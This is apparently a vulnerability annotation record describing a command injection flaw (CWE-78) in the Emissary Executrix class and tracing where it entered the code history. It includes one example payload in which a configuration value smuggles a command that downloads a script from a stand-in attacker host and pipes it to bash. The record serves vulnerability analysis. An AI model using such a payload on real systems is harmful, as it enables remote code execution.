bug_semantics: Emissary Executrix command injection (CWE-78): PLACE_NAME is read from configuration, sanitized only by replacing spaces with underscores, then used as the prefix of a temporary directory path that is concatenated unquoted into a /bin/sh -c string. Shell metacharacters such as ; | $ ` ( ) survive that replace and execute as additional commands when Executrix runs getCommand. Attack requires control of configuration (admin or a compromised config source). Example: PLACE_NAME=test;curl attacker.com/shell.sh|bash;x becomes a cd ...; curl_... |bash fragment inside the shell.
flaw_origin: The vulnerable mechanism was first written in the public root commit that added src/main/java/emissary/util/shell/Executrix.java on 2018-06-01: (1) this.placeName = this.placeName.replace(' ', '_'); (2) FileManipulator.mkTempFile(this.tmpDir, this.placeName) for tmpNames[DIR]; (3) new String[] {"/bin/sh", "-c", "... cd " + tmpNames[DIR] + "; " + c}. Those three pieces appear together in that first-write. Later history only reformatted the sink, skipped ulimit -v on macOS, dropped the Windows wrapper, or moved the same mkTempFile(placeName) call into TempFileNames (#1037); none of those refactors invented the injection.
